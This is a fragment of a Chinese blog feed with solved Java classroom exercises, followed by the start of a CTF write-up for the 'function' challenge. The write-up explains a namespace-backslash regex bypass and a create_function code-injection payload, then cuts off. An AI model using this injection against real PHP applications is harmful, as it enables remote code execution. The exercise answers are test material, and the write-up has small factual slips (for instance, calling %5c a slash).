class="keyword">int</span>[<span class="number">20</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> <span class="keyword">sum</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">            arr[i] = arr[i<span class="number">-1</span>] + arr[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">sum</span> = <span class="keyword">sum</span> + arr[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">"前20个元素的和为"</span> + <span class="keyword">sum</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/********end********/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用递归计算1＋2＋…＋n之和。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package step3;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Sum</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span> args[])&#123;</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">int</span> <span class="built_in">num</span> = sc.nextInt();</span><br><span class="line">        <span class="built_in">int</span> result = recursionSum(<span class="built_in">num</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="built_in">int</span> recursionSum(<span class="built_in">int</span> mum)&#123;</span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****begin**</span><span class="strong">*****</span>**/</span></span>       </span><br><span class="line"><span class="keyword">if</span>(mum==<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> mum+recursionSum(mum<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****end**</span><span class="strong">*****</span>**/</span></span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类的定义 与 对象的创建<br>设计一个表示学生的类，该类具有表示姓名的属性name和表示年龄的属性age，同时还具有表示说话行为的方法speak()，用于输出学生的姓名和年龄。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package task01;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据TODO提示信息，在横线处编写对应功能代码，</span></span><br><span class="line"><span class="comment"> *      编写代码时，注意要删除对应的横线。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// TODO 在此定义学生类名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><br><span class="line">    <span class="comment">// TODO 在此定义2个成员变量</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"我的姓名:"</span>+name+<span class="string">",年龄:"</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Task01</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line">        <span class="comment">// TODO 在此定义一个学生对象</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">// TODO 在此给学生对象姓名赋值</span></span><br><span class="line">        stu.name = scan.next();</span><br><span class="line">        <span class="comment">// TODO 在此给学生对象年龄赋值</span></span><br><span class="line">        stu.age = scan.nextInt();</span><br><span class="line">        <span class="comment">// TODO 在此调用学生对象 speak() 方法</span></span><br><span class="line">        stu.speak();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本实训将创建三个学生对象，它们的引用变量分别是s1、s2和s3，首先分别使用s1和s2引用为name和age赋值，然后调用speak()方法，最后将s2变量赋值给s3，s3也调用speak()方法。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package task02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据提示，补充完整 begin 和 end 之间的代码。</span></span><br><span class="line"><span class="comment"> *     （其他代码可以不用改）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// 在此定义学生类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// 在此定义2个成员变量：姓名name和年龄age</span></span><br><span class="line">    <span class="built_in">String</span> name;</span><br><span class="line"><span class="built_in">int</span> age;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> speak() &#123;</span><br><span class="line">System.out.println(<span class="string">"我的名字是"</span> + name + <span class="string">",今年"</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task02</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 创建Student类的第一个对象，其引用变量为s1，</span></span><br><span class="line"><span class="comment"> * 使用s1分别为name和age赋值，值为运行时接收从键盘输入</span></span><br><span class="line"><span class="comment"> * 然后调用speak()方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">s1.name = scan.next();</span><br><span class="line">        s1.age = scan.nextInt();</span><br><span class="line">        s1.speak();</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 创建Student类的第二个对象，其引用变量为s2，</span></span><br><span class="line"><span class="comment"> * 使用s2分别为name和age赋值，值为运行时接收从键盘输入，</span></span><br><span class="line"><span class="comment"> * 然后调用speak()方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        s2.name = scan.next();</span><br><span class="line">        s2.age = scan.nextInt();</span><br><span class="line">        s2.speak();</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 创建Student类的第三个对象，其引用变量为s3，</span></span><br><span class="line"><span class="comment"> * 将s2的值赋给s3，</span></span><br><span class="line"><span class="comment"> * 然后使用s3调用speak()方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student();</span><br><span class="line">        s3 = s2;</span><br><span class="line">        s3.speak();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对类进行封装，防止外界对类中的成员变量随意访问。<br>为了掌握类的封装，本练习将使用private关键字对学生类的成员变量name和age进行私有化，同时分别提供一个setName(String n)和setAge(int a)方法用于外界的访问，其中setAge(int a)中需要对age进行判断。</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package task03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据提示，补充完整 begin 和 end 之间的代码。</span></span><br><span class="line"><span class="comment"> *     （其他代码可以不用改）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// 在此定义学生类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"> <span class="comment">// 将名字name和年龄age属性定义为私有的</span></span><br><span class="line">private <span class="built_in">String</span> name;</span><br><span class="line">    private <span class="built_in">int</span> age;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 定义4个公有的方法：getName()、setName(String n)、</span></span><br><span class="line"><span class="comment"> * getAge()和setAge(int a)，</span></span><br><span class="line"><span class="comment"> * 用于对外访问name和age。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在setAge(int a)方法中对传入的参数进行检查，</span></span><br><span class="line"><span class="comment"> * 如果输入值为负数，则打印出“设置的年龄不合法”，</span></span><br><span class="line"><span class="comment"> * 如果不为负数，才将其设置为age属性的值。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="built_in">String</span> getName()&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="built_in">int</span> getAge()&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setAge(<span class="built_in">int</span> age)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(age&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"设置的年龄不合法"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setName(<span class="built_in">String</span> name)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> speak() &#123;</span><br><span class="line">System.out.println(<span class="string">"我的名字是"</span> + name + <span class="string">",今年"</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task03</span></span>&#123;</span><br><span class="line">public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"><span class="built_in">String</span> name1 = scan.next();</span><br><span class="line"><span class="built_in">int</span> age1 = scan.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 创建Student类的实例对象，</span></span><br><span class="line"><span class="comment"> * 通过调用对象的setName(String n)和setAge(int a)方法</span></span><br><span class="line"><span class="comment"> * 来设置实例对象的name属性和age属性值，</span></span><br><span class="line"><span class="comment"> * 方法的参数值为运行时接收从键盘输入，</span></span><br><span class="line"><span class="comment"> * 并调用speak()方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.setName(name1);</span><br><span class="line">        stu.setAge(age1);</span><br><span class="line">        stu.speak();</span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> chapter2.step7;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;        <span class="comment">//1.导入Scanner</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> HelloWorld&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        Scanner input = <span class="keyword">new</span> Scanner(System.in);    <span class="comment">//2.声明扫描仪</span></span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请录入嫦娥个人信息："</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入姓名："</span>);</span><br><span class="line">        String name = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入年龄："</span>);</span><br><span class="line">        <span class="keyword">int</span> age = input.nextInt();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入性别："</span>);</span><br><span class="line">        String sex = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入体重："</span>);</span><br><span class="line">        <span class="keyword">float</span> weight = input.nextFloat();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入地址："</span>);</span><br><span class="line">        String address = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入是否已婚："</span>);</span><br><span class="line">        String isMarried = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"信息如下："</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t姓名："</span> + name);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t年龄："</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t性别："</span> + sex);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t体重："</span> + weight + <span class="string">"kg"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t地址："</span> + address);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t婚否："</span> + isMarried);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>湖湘杯web_WP</title>
      <link href="/2019/03/25/%E6%B9%96%E6%B9%98%E6%9D%AFweb-WP/"/>
      <url>/2019/03/25/%E6%B9%96%E6%B9%98%E6%9D%AFweb-WP/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>thinkphp搭建博客</title>
      <link href="/2019/03/24/thinkphp%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/24/thinkphp%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>p神代码审计知识星球二周年wp</title>
      <link href="/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/"/>
      <url>/2019/03/24/p%E7%A5%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4wp/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg" alt=""></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口<br>在一个目录输入<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/phith0n/code-breaking.git</span><br></pre></td></tr></table></figure></p><p>然后进入一个题目目录，然后输入<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p><p>环境运行后，在docker-compose.yml中查看端口，访问即可</p><h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>端口8087<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pu9e3j9sj30ng08smxf.jpg" alt=""><br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span></span><br></pre></td></tr></table></figure></p><p>双问号为三元运算表达式<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span> = a ?? b<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">表示如果a非空，则c = a，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果a为空，则 c = b；</span></span><br></pre></td></tr></table></figure></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">等价于</span><br><span class="line"></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>即输入两个参数，若输入，则取我们的输入，否则为空<br>然后是对<code>$_GET[&#39;action&#39;]</code>的正则表达式过滤<br>因为正则里用了^$，那么有没有可能在开头或结尾加入某个字符来绕过正则<br>一旦绕过正则，则可以进行危险函数构造<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qfng2to2j30zf0hgn2b.jpg" alt=""><br>%5c 是 <code>/</code><br>仅当使用%5c打头时，我们可以正常运行var_dump()，并且成功满足正则。<br>那么这是为什么呢？<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\在php中表示默认的命名空间,所有原生函数和类都在这个命名空间中</span><br><span class="line">普通调用一个函数，如果直接写函数名<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>)调用，调用的时候其实相当于写了一个相对路径；</span></span><br><span class="line"><span class="function">而如果写\<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>) 这样调用函数，则其实是写了一个绝对路径。</span></span></span><br><span class="line"><span class="function"><span class="function">如果你在其他<span class="title">namespace</span>里调用系统类，就必须写绝对路径这种写法</span></span></span><br></pre></td></tr></table></figure></p><p>接下来需要找一个第二个参数可以引发危险的函数<br>string create_function ( string $args , string $code )<br>第一个参数控制函数的变量名，第二个参数控制函数内的代码<br>举例:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">create_function</span><span class="params">(<span class="string">'$fname'</span>,<span class="string">'echo $fname."可乐"'</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>等价于<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类似于：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">(<span class="keyword">$fn</span>ame)</span> &#123;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="keyword">$fn</span>ame.<span class="string">"可乐"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来利用create_function() 注入<br>$arg = return “2333”;}phpinfo();/*<br>相当于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 